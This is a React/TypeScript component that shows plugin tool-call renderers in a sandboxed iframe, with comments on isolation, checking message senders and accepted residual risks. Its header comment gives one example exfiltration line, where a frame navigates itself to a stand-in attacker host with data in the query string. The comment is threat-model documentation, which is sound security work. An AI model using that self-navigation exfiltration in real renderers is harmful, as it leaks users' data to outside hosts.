"use client";

/**
 * Renders a plugin-registered tool call inside a sandboxed `<iframe>`.
 *
 * This is the ONE place plugin-authored code reaches the browser — every
 * other plugin capability (`@paco/plugin-host`) runs in a worker process on
 * the server, never here. The isolation therefore has to come from the
 * browser itself:
 *
 * - `sandbox="allow-scripts"` and NOTHING else. In particular, no
 *   `allow-same-origin` — the served document (`app/api/plugins/renderer/
 *   [pluginId]/[file]/route.ts`) is same-origin with Paco's own app, and
 *   `allow-same-origin` would let it use that origin's `document.cookie`,
 *   `localStorage`, and `fetch` credentials. Omitting it makes the
 *   document's origin opaque ("null") instead, so it has none of that. And
 *   no `allow-top-navigation` / `allow-popups` (both absent by default):
 *   the frame cannot redirect the TAB it's embedded in or open a new one.
 * - The tool call's own input/output — nothing else — is the only thing
 *   posted in. No ambient Paco state (session, cookies, other tool calls)
 *   ever reaches this frame.
 *
 * See `isMessageFromIframe`'s doc comment for why the *parent's* own
 * `message` listener has to validate the sender by identity rather than by
 * `event.origin` — the opaque-origin document above makes `event.origin`
 * uninformative in both directions.
 *
 * ## What is NOT enforced
 *
 * `postMessage` to the parent is this frame's *intended* channel out — it
 * is not its *only* one. `sandbox="allow-scripts"` without
 * `allow-top-navigation` stops the frame from navigating the TOP window or
 * any OTHER frame, but a sandboxed frame can always navigate ITSELF —
 * `location.href = "https://attacker.example/?d=" + payload` — in every
 * shipping browser, and no CSP directive (here or anywhere) closes that off;
 * `default-src`/`connect-src 'none'` restricts `fetch`/`XHR`/`WebSocket`,
 * not top-level navigation of the frame's own document. So a malicious
 * renderer CAN exfiltrate whatever it was handed, by self-navigating to an
 * attacker-controlled URL with the data in the query string or fragment.
 * The mitigation is not preventing that channel — it can't be — it's
 * making what travels through it worthless: the payload
 * (`buildPluginToolCallMessage`) is exactly this one tool call's own
 * `input`/`output`, the same data the equivalent non-plugin renderer
 * already puts in the visible DOM. Nothing from Paco's session, other
 * chats, or other tool calls is ever in it.
 */
import type { ToolRenderState } from "@paco/shared/lib/tool-state";
import { useEffect, useRef, useState } from "react";
import { getToolName } from "@/app/lib/render-tool";
import type { WebAgentUIToolPart } from "@/app/types";
import { cn } from "@/lib/utils";

export type PluginRendererProps = {
  part: WebAgentUIToolPart;
  state: ToolRenderState;
  /** The enabled plugin whose renderer matched this tool call's name. */
  pluginId: string;
  /** The `renderers/<file>` this tool call's name resolved to (e.g. `"search_docs.html"`). */
  file: string;
};

const MIN_IFRAME_HEIGHT = 48;
const MAX_IFRAME_HEIGHT = 480;
const DEFAULT_IFRAME_HEIGHT = 120;

/** Clamps a requested iframe height into a sane, bounded range. */
export function clampIframeHeight(height: number): number {
  if (!Number.isFinite(height)) {
    return DEFAULT_IFRAME_HEIGHT;
  }
  return Math.min(Math.max(height, MIN_IFRAME_HEIGHT), MAX_IFRAME_HEIGHT);
}

/** The message posted into the iframe once its document has loaded. */
export type PluginToolCallMessage = {
  type: "paco-plugin-tool-call";
  toolName: string;
  toolCallId: string;
  toolState: WebAgentUIToolPart["state"];
  input: unknown;
  output?: unknown;
};

/**
 * Builds the payload `PluginRenderer` posts into its iframe on load.
 *
 * Exported and kept pure so it can be unit-tested directly — the message
 * itself never reaches a DOM `postMessage` call in a test, only its shape.
 * The payload is exactly the data the equivalent non-plugin renderer
 * already displays for this tool call (name, input, output once
 * available); nothing from Paco's own session ever goes in it.
 */
export function buildPluginToolCallMessage(
  part: WebAgentUIToolPart,
): PluginToolCallMessage {
  return {
    type: "paco-plugin-tool-call",
    toolName: getToolName(part),
    toolCallId: part.toolCallId,
    toolState: part.state,
    input: part.input,
    output: part.state === "output-available" ? part.output : undefined,
  };
}

type PluginHeightMessage = {
  type: "paco-plugin-renderer-height";
  height: unknown;
};

function isPluginHeightMessage(data: unknown): data is PluginHeightMessage {
  return (
    typeof data === "object" &&
    data !== null &&
    (data as { type?: unknown }).type === "paco-plugin-renderer-height"
  );
}

/**
 * Whether a `message` event actually came from THIS component's own
 * iframe.
 *
 * The iframe is sandboxed without `allow-same-origin`, so its document has
 * an opaque origin — every message it sends carries `event.origin ===
 * "null"`, the exact same value any other opaque-origin frame on the page
 * (another plugin renderer, an ad frame, anything) would also produce.
 * `event.origin` therefore cannot distinguish "our plugin's iframe" from
 * "some other sandboxed frame" here, which is the direction that actually
 * matters for a parent `message` listener: comparing `event.source` — a
 * reference to the exact window that posted the message — to this
 * component's own `iframe.contentWindow` is the check that does.
 */
export function isMessageFromIframe(
  event: Pick<MessageEvent, "source">,
  iframeWindow: Window | null,
): boolean {
  return iframeWindow !== null && event.source === iframeWindow;
}

/** The same-origin route (`route.ts` in this directory's sibling api route) that serves a plugin's renderer HTML. */
export function buildRendererSrc(pluginId: string, file: string): string {
  return `/api/plugins/renderer/${encodeURIComponent(pluginId)}/${encodeURIComponent(file)}`;
}

export function PluginRenderer({
  part,
  state,
  pluginId,
  file,
}: PluginRendererProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState(DEFAULT_IFRAME_HEIGHT);

  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      const iframeWindow = iframeRef.current?.contentWindow ?? null;
      if (!isMessageFromIframe(event, iframeWindow)) {
        return;
      }
      if (
        isPluginHeightMessage(event.data) &&
        typeof event.data.height === "number"
      ) {
        setHeight(clampIframeHeight(event.data.height));
      }
    }

    window.addEventListener("message", handleMessage);
    return () => window.removeEventListener("message", handleMessage);
  }, []);

  function handleLoad() {
    const target = iframeRef.current?.contentWindow;
    if (!target) {
      return;
    }
    // targetOrigin "*": the iframe's origin is opaque ("null") because
    // `sandbox` deliberately omits `allow-same-origin` (see this file's
    // header comment), so there is no real origin string for postMessage
    // to match against — "*" is the only targetOrigin an opaque-origin
    // target can ever receive. That's acceptable here because the payload
    // carries nothing beyond this tool call's own input/output (see
    // `buildPluginToolCallMessage`) — NOT because the sandbox stops the
    // frame from doing something worse with it. A sandboxed frame can
    // always navigate itself (`location.href = ...`) regardless of when
    // this send lands; see this file's header comment, "What is NOT
    // enforced", for why that residual channel is accepted rather than
    // closed.
    target.postMessage(buildPluginToolCallMessage(part), "*");
  }

  const statusColor = state.error
    ? "bg-error"
    : state.running
      ? "animate-pulse bg-warning"
      : "bg-success";

  return (
    <div className="overflow-hidden rounded-md border border-base-300 bg-base-100">
      <div className="flex items-center gap-2 border-base-300 border-b bg-base-200/50 px-3 py-1.5 text-base-content/70 text-xs font-medium">
        <span
          className={cn("inline-block h-2 w-2 rounded-full", statusColor)}
        />
        {pluginId}
      </div>
      <iframe
        ref={iframeRef}
        title={`${pluginId} renderer`}
        src={buildRendererSrc(pluginId, file)}
        sandbox="allow-scripts"
        onLoad={handleLoad}
        style={{ height, width: "100%", border: "none", display: "block" }}
      />
    </div>
  );
}
